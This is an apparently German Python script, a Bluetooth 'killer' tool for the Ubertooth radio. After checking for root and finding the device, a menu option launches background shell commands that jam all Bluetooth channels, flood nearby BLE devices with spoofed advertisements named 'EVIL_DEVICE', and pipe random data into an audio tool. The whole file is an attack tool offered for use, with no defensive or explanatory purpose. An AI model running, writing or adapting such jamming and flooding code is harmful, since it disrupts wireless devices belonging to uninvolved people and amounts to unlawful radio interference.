#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH HARDWARE KILLER v666 - ABSOLUTE ERKENNUNG

import os
import sys
import re
import time
import usb.core
import signal
import subprocess
from datetime import datetime
import colorama
from colorama import Fore, Style

colorama.init()

class UberDetector:
    def __init__(self):
        self.UBERTOOTH_VENDOR = 0x1D50
        self.UBERTOOTH_PRODUCT = 0x6002
        self.DFU_PRODUCT = 0x6007
        self.device = None
        self.running = True
        signal.signal(signal.SIGINT, self.kill_all)

    def detect_ubertooth(self):
        """Erzwingt Hardware-Erkennung mit USB-Abfrage"""
        self.device = usb.core.find(idVendor=self.UBERTOOTH_VENDOR,
                                  idProduct=self.UBERTOOTH_PRODUCT)
        
        if not self.device:
            # Checke DFU-Modus als Fallback
            self.device = usb.core.find(idVendor=self.UBERTOOTH_VENDOR,
                                      idProduct=self.DFU_PRODUCT)
            if self.device:
                print(f"{Fore.YELLOW}Ubertooth im DFU-Modus! Flashe Firmware...{Style.RESET_ALL}")
                os.system("ubertooth-dfu -d bluetooth_rxtx.dfu -U")
                time.sleep(3)
                return self.detect_ubertooth()  # Erneuter Versuch
        
        return self.device is not None

    def kill_all(self, sig=None, frame=None):
        """Tötet ALLE Prozesse brutal"""
        print(f"\n{Fore.RED}🔥 VERBRENNE ALLE PROZESSE!{Style.RESET_ALL}")
        os.system("pkill -9 -f 'ubertooth|hcidump|btmon'")
        sys.exit(0)

    def show_banner(self):
        os.system('clear')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH HARDWARE KILLER v666
   • 100% Hardware-Erkennung •
   • Kein Entkommen mehr    •
 ------------------------------------
{Style.RESET_ALL}""")

    def brute_force_mode(self):
        """Aktiviert den absoluten Zerstörungsmodus"""
        self.show_banner()
        print(f"{Fore.RED}💣 AKTIVIERE BRUTE-FORCE-MODUS!{Style.RESET_ALL}")
        
        # 1. Alle Bluetooth-Kanäle jammen
        subprocess.Popen("ubertooth-jam -b -H -P 100", shell=True, 
                        preexec_fn=os.setsid)
        
        # 2. BLE-Geräte fluten
        subprocess.Popen("ubertooth-btle -a -A -M -n 'EVIL_DEVICE' -c 666", 
                        shell=True, preexec_fn=os.setsid)
        
        # 3. Audio-Hölle
        subprocess.Popen("dd if=/dev/urandom | hstest /dev/stdin", 
                        shell=True, preexec_fn=os.setsid)

        input(f"\n{Fore.RED}DRÜCKE ENTER UM DIE HÖLLE ZU STOPPEN{Style.RESET_ALL}")
        self.kill_all()

    def main(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}Nur root darf spielen! sudo {sys.argv[0]}{Style.RESET_ALL}")
            sys.exit(1)

        if not self.detect_ubertooth():
            print(f"\n{Fore.RED}🚨 UBERTOOTH NICHT GEFUNDEN!{Style.RESET_ALL}")
            print("1. Gerät einstecken")
            print("2. USB-Kabel prüfen")
            print("3. lsusb | grep Ubertooth ausführen")
            sys.exit(1)

        self.show_banner()
        print(f"{Fore.GREEN}✔ Ubertooth erkannt!{Style.RESET_ALL}")
        print(f"\n{Fore.RED}=== BÖSE OPTIONEN ==={Style.RESET_ALL}")
        print("1. Totaler Zerstörungsmodus")
        print("2. Gezielten Angriff starten")
        print("3. Beenden")
        
        choice = input("\nWähle deine Waffe: ")
        
        if choice == "1":
            self.brute_force_mode()
        elif choice == "2":
            print(f"{Fore.YELLOW}Feature kommt in v667!{Style.RESET_ALL}")
        else:
            self.kill_all()

if __name__ == "__main__":
    killer = UberDetector()
    killer.main()
